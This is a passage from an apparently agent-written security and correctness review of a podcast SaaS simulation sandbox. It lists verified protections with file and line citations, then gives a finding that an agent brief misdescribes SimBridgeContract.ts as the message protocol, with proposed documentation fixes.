  host's messages — it simply never adopts a port and falls to legacy.
- **Message-table parity.** `CHILD_INBOUND` / `ACTIVATION_SCOPED` restated in
  simRuntimeChild.ts:680-690 match `CHILD_INBOUND_TYPES` / `ACTIVATION_SCOPED_TYPES` in
  runtimeProtocol.ts:134-141, 480-485 exactly (14 and 17 entries). Parent-inbound parity is the one
  gap — finding simulation-005.
- **Transport privacy.** The parent addresses the exact derived origin and never `'*'`
  (SimTransport.ts:266-279), refuses a frame without `allow-same-origin`
  (SimTransport.ts:122-127, 196-202), tombstones the prior document epoch before adopting a new one
  (SimTransport.ts:178-189), and closes both losing and superseded ports.
- **RUM ingestion.** Rate-limited per client IP (sim-rum.controller.ts:68), body-limited to 256 KB
  before parsing (:35, :44), schema-validated with every field length- or range-bounded
  (rumEvents.ts:220-261), clamped again at insert (RumService.ts:334-341), and gated by a
  server-side kill switch that defaults to 0 (RumService.ts:167). Nothing is echoed back or
  rendered; the response is fixed at 204 before any work happens. The retention sweep is bounded
  per statement and in iterations (RumService.ts:236-267). The only defect is who runs it —
  simulation-011.
- **Revision immutability.** `writeFile` is a genuine single chokepoint: it refuses any revision not
  in `uploading` and re-parses the composed key back to the same revision id
  (RevisionService.ts:331-350). Activation is demote → promote → pointer, all three compare-and-set,
  in one transaction, backed by the `uniq_sim_revisions_active` partial unique index
  (RevisionService.ts:602-719). `markFailed` refuses to fail the active revision in place (:296-299).
  `gc` deletes the row before the bytes, keeps a floor of 2, and refuses a prefix that does not
  resolve back to the revision (:799-838). I could not find a way to mutate a published revision.
- **Identity hash coverage.** `canonicalizeConfig` (simIdentity.ts:106-126) covers every field of
  `SimPresentationConfig` — `simpleUi`, `autoScript`, `quality`, `aspect`, `transparent`,
  `hideSelectors` as a set, `initialState` with sorted keys and a non-finite rejection. The poster
  key adds `packageRevision` + `variantKey` on top (posterIdentity.ts:30-36). I found no rendering
  input that is outside the hash. `packageRevisionFor` correctly switches to the revision id once a
  revision exists (simRevision.ts:125-135), so a republish always mints a new identity.
- **Cache correctness.** `isVerifiedRevisionKey` requires a UUID at the revision position AND a row
  belonging to the same simulation, fails closed on every doubt including a DB fault, and caches
  both answers for 60 s (revisionIdentity.ts:88-112). The entry document is excluded from immutable
  caching because the boot snippet is injected at serve time
  (sim-public.controller.ts:151-156, RevisionService.ts:916-919). No absolute URL is baked into a
  stored value — `simulations.entry_file` stores a key and `resolveSimulationUrl` composes the
  public URL per request, and `openTransport` deliberately reads `frame.src` rather than the stored
  key for exactly the `localhost` class of drift (SimRuntimeClient.ts:1124-1132).
- **Poster fallback visibility.** `PosterService` is storage/lifecycle only; the substitution
  decision lives in the client. `POLICY_REFUSED` → `reactivateForPolicy` is explicitly telemetered
  ("The honest fallback. It DOES reset the section, which is why it is never silent",
  SimRuntimeClient.ts:1392), and `transport-legacy-*` telemetry names every fallback to v2. I found
  no silent poster substitution in backend code.

---

### [P3] Fleet: `SimBridgeContract.ts` is not the postMessage protocol, and the agent brief says it is
- id: simulation-017
- location: podcast-saas/backend-api/src/services/simulation/SimBridgeContract.ts:1
- category: fleet
- confidence: high
- status: confirmed
- what: The `simulation-reviewer` brief instructs "Read `SimBridgeContract.ts` first and write down
  the message table … `SimBridgeContract.ts` defines the message protocol between the host page and
  the sandboxed child. Check: every message type declared is handled on both sides". That file
  declares no message types at all. It is a static compatibility checker that proves a replacement
  bundle still provides the DOM ids / CSS classes / label text / window globals that the preserved
  `bridge.js` section bodies bind to (SimBridgeContract.ts:1-36, `extractBridgeContract` at :145).
  The actual wire protocol is `shared/src/sim/runtimeProtocol.ts` (v3 envelopes, 31 message types)
  and the v2 `startScript`/`SIM_READY` message set embedded in `SimulationService.ts`'s bridge
  template; the child half is `simRuntimeChild.ts` and the parent half is
  `client-web/lib/sim/SimTransport.ts` + `SimRuntimeClient.ts`.
- why: `stack.md` §6.4 describes the same file only as "a cross-boundary contract between backend,
  `shared/src/sim`, and sandboxed iframes", which is vague enough to have seeded the stronger, wrong
  claim in the agent brief. An agent following the brief literally starts by looking for a message
  table in a file that has none, and can plausibly conclude the protocol is undocumented or invent
  one. Per PROTOCOL.md §"stack.md wins", the contradiction is itself reportable.
- evidence: Read SimBridgeContract.ts end to end (423 lines): the exported surface is
  `extractBridgeContract`, `extractContractsFromBridge`, `buildSources`, `verifyContract`,
  `checkReplaceCompatibility`, `describeIncompatibility`. `grep -n "postMessage\|MessagePort"
  SimBridgeContract.ts` → the only hit is the string `'postMessage'` in the `BRIDGE_BUILTINS`
  denylist at :107-108. Its single caller is the replace endpoint
  (simulations.controller.ts:391).
- fix: In `.claude/reference/stack.md` §6 item 4, replace the `SimBridgeContract.ts` reference with
  the real protocol files (`shared/src/sim/runtimeProtocol.ts` ← host `client-web/lib/sim/SimTransport.ts`
  + `SimRuntimeClient.ts` ← child `backend-api/src/services/simulation/simRuntimeChild.ts`), and note
  separately that `SimBridgeContract.ts` is the replace-time anchor checker. Then correct the
  `simulation-reviewer` agent brief's "Bridge contract integrity" section to point at
  `runtimeProtocol.ts` for the message table.
- cross: @fleet-maintainer
- effort: S
